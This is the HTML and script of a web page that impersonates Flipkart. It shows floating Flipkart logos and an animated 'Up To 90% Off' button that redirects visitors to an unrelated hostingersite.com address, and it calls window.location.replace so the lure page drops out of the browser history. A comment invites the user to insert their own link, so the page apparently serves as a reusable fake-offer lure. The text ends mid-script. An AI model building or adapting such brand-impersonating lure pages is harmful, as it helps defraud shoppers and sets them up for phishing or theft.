<!DOCTYPE html>
<html lang="gu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flipkart - Special Offer</title>
    <style>
        /* બેકગ્રાઉન્ડ સેટિંગ્સ */
        body, html {
            height: 100%; margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            background-color: #2874f0; font-family: Arial, sans-serif;
            overflow: hidden;
        }

        /* લોગો તરવા માટેનું એનિમેશન */
        @keyframes floatEffect {
            0% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(30px, 30px) rotate(180deg); }
            100% { transform: translate(0, 0) rotate(360deg); }
        }

        .floating-logo {
            position: absolute; width: 50px; opacity: 0.2; z-index: 1; pointer-events: none;
        }

        /* મેઈન કન્ટેનર */
        .container { 
            text-align: center; 
            z-index: 100; /* આને ઉપર રાખ્યું છે જેથી ગાયબ ન થાય */
            position: relative; 
        }

        /* ઉપરનું લખાણ */
        .top-text { 
            font-size: 20px; 
            font-weight: bold; 
            color: #ffffff; 
            margin-bottom: 15px; 
            text-transform: uppercase;
            display: block;
        }

        /* બટનનું એનિમેશન (Shake) */
        @keyframes shake {
            0% { transform: scale(1); }
            10% { transform: scale(1.1) rotate(-2deg); }
            20% { transform: scale(1.1) rotate(2deg); }
            30% { transform: scale(1.1) rotate(-2deg); }
            40% { transform: scale(1.1) rotate(2deg); }
            50% { transform: scale(1); }
            100% { transform: scale(1); }
        }

        /* શોર્ટ અને ગોળ બટન */
        .flipkart-button {
            background-color: #ffe11b; 
            color: #212121;
            padding: 15px 40px; 
            border: none; 
            border-radius: 50px; 
            cursor: pointer; 
            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
            display: inline-block; 
            text-decoration: none;
            animation: shake 1.5s infinite ease-in-out;
            position: relative;
        }

        .offer-text { 
            font-size: 22px; 
            font-weight: 900; 
            display: block; 
            line-height: 1;
        }

        .click-here-text { 
            font-size: 13px; 
            display: block; 
            margin-top: 5px; 
            font-weight: bold; 
        }
    </style>
</head>
<body>

    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:5%; left:5%; animation: floatEffect 10s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:15%; left:80%; animation: floatEffect 15s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:40%; left:10%; animation: floatEffect 12s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:80%; left:15%; animation: floatEffect 18s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:50%; left:85%; animation: floatEffect 14s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:85%; left:75%; animation: floatEffect 16s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:5%; left:45%; animation: floatEffect 11s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:50%; animation: floatEffect 20s infinite linear;">

    <div class="container">
        <span class="top-text">Claim your deal</span>
        
        <a href="https://darkred-ferret-918962.hostingersite.com/" class="flipkart-button" id="targetBtn">
            <span class="offer-text">Up To 90% Off</span>
            <span class="click-here-text">Click Here</span>
        </a>
    </div>

    <script>
        // અહીં તમારી લિંક નાખો
        var finalUrl = "https://darkred-ferret-918962.hostingersite.com/"; 

        // ક્લિક અને રિડાયરેક્ટ ફંક્શન
        document.getElementById("targetBtn").onclick = function(e) {
            e.preventDefault();
            window.location.replace(finalUrl);
        };
